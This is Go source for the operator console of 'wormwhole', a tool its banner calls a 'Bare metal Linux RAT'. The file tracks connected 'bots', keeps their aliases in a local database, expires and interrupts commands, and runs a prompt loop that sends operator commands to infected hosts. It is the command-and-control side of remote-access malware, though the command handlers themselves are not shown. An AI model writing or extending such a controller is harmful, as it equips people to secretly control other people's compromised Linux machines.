package console

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"github.com/prologic/bitcask"
	"github.com/xorium/wormwhole/core"
	"github.com/xorium/wormwhole/server"
	"log"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	stateReady            = iota
	stateExecutingCommand = iota
)

const (
	commandExpireTime = time.Hour
)

type Console struct {
	*sync.RWMutex
	Debug            bool
	srv              *server.CommandServer
	reader           *bufio.Reader
	currentBot       *server.Bot
	currentState     int
	state            *bitcask.Bitcask
	commandsHandlers map[*regexp.Regexp]func([]string) error
	currentBotsList  []*server.Bot
}

func NewConsole(srv *server.CommandServer) *Console {
	db, _ := bitcask.Open("wormwhole.db")
	return &Console{
		RWMutex:      new(sync.RWMutex),
		srv:          srv,
		reader:       bufio.NewReader(os.Stdin),
		state:        db,
		currentState: stateReady,
	}
}

func (c *Console) startInterruptHandling() {
	go func() {
		sigChan := make(chan os.Signal)
		for {
			signal.Notify(sigChan, os.Interrupt)
			<-sigChan

			currentCommands := c.srv.ListCommands()
			// TODO: send interrupt signal to client.
			for _, command := range currentCommands {
				command.SetState(core.CommandStateInterrupted)
			}
			c.Lock()
			c.currentState = stateReady
			c.Unlock()
			fmt.Println()
			c.printCommandInvitation()
		}
	}()
}

func (c *Console) initServerHandlers() {
	c.srv.SetOnConnect(func(bot *server.Bot) {
		c.Lock()
		c.currentBotsList = c.srv.ListBots()
		c.Unlock()
		printer := color.New(color.FgHiGreen, color.Bold)
		_, _ = printer.Printf("\n[+] bot connected: %s\n", bot.String())
		c.printCommandInvitation()
	})

	c.srv.SetOnDisconnect(func(bot *server.Bot) {
		printer := color.New(color.FgHiRed, color.Bold)
		_, _ = printer.Printf("\n[-] bot disconnected: %s\n", bot.String())
		if c.currentBot != nil && c.currentBot.ID == bot.ID {
			c.Lock()
			c.currentBotsList = c.srv.ListBots()
			c.currentBot = nil
			c.currentState = stateReady
			c.Unlock()
		}
		c.printCommandInvitation()
	})

	c.srv.SetOnCommandRespHandler(func(cmd *core.Command, resp []byte) {
		if cmd.State() == core.CommandStateInterrupted {
			if c.Debug {
				log.Println("interrupted command: ", cmd)
			}
			return
		}
		c.Lock()
		c.currentState = stateReady
		c.Unlock()
		if cmd.State() == core.CommandStateFailed {
			color.HiRed("command error: %s\n", string(resp))
			c.printCommandInvitation()
			return
		}
		color.White(string(resp))
		c.printCommandInvitation()
	})
}

func (c *Console) getBotString(bot *server.Bot) string {
	botAlias := c.getAlias(bot.ID)
	botStr := bot.String()
	if botAlias != "" {
		botStr = botAlias
	}
	return botStr
}

func (c *Console) getAlias(botId string) string {
	alias, err := c.state.Get([]byte("alias:" + botId))
	if err != nil {
		if c.Debug {
			log.Println("error while getting bot alias: ", err)
		}
		return ""
	}
	if alias == nil {
		return ""
	} else {
		return string(alias)
	}
}

func (c *Console) saveAlias(botId, alias string) {
	c.Lock()
	err := c.state.Put([]byte("alias:"+botId), []byte(alias))
	c.Unlock()
	if err != nil {
		log.Println("error while saving bot alias: ", err)
	}
}

func (c *Console) startCheckingExpiringCommands() {
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer func() { _ = ticker.Stop }()
		for range ticker.C {
			for _, cmd := range c.srv.ListCommands() {
				if cmd.State() != core.CommandStateExecuting {
					c.srv.DeleteCommand(cmd.ID)
					continue
				}
				cmdTime, err := strconv.ParseInt(cmd.ID, 10, 64)
				if err != nil {
					log.Println("can't parse command ID to time: ", err)
					continue
				}
				if time.Duration(time.Now().UnixNano()-cmdTime) > commandExpireTime {
					c.srv.DeleteCommand(cmd.ID)
					color.Red("command %s %s has been expired", cmd.ID, cmd.Name)
				}
			}
		}
	}()
}

func (c *Console) getInput() (string, error) {
	text, err := c.reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return text, nil
}

func (c *Console) printCommandInvitation() {
	prefix := "wormhole"
	c.RLock()
	defer c.RUnlock()
	if c.currentBot != nil {
		if c.currentState == stateExecutingCommand {
			return
		}
		alias := c.getAlias(c.currentBot.ID)
		if alias != "" {
			prefix = alias
		} else {
			prefix = c.currentBot.IP
		}
	}
	printer := color.New(color.FgHiGreen)
	_, _ = printer.Printf(prefix + "> ")
}

func (c *Console) printBanner() {
	banner := `
██╗    ██╗ ██████╗ ██████╗ ███╗   ███╗██╗  ██╗ ██████╗ ██╗     ███████╗
██║    ██║██╔═══██╗██╔══██╗████╗ ████║██║  ██║██╔═══██╗██║     ██╔════╝
██║ █╗ ██║██║   ██║██████╔╝██╔████╔██║███████║██║   ██║██║     █████╗  
██║███╗██║██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║██║   ██║██║     ██╔══╝  
╚███╔███╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗███████╗
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
                        Bare metal Linux RAT
`
	color.Green(banner)
}

func (c *Console) Run() {
	c.initCommands()
	c.initServerHandlers()
	c.startInterruptHandling()
	c.startCheckingExpiringCommands()
	c.printBanner()

	for {
		c.printCommandInvitation()
		text, err := c.getInput()
		if err != nil {
			log.Println("error while getting command input: ", err)
			continue
		}
		if text = strings.TrimRight(text, "\n"); text == "" {
			continue
		}
		if err := c.handleCommandInput(text); err != nil {
			color.HiRed(err.Error())
		}
	}
}
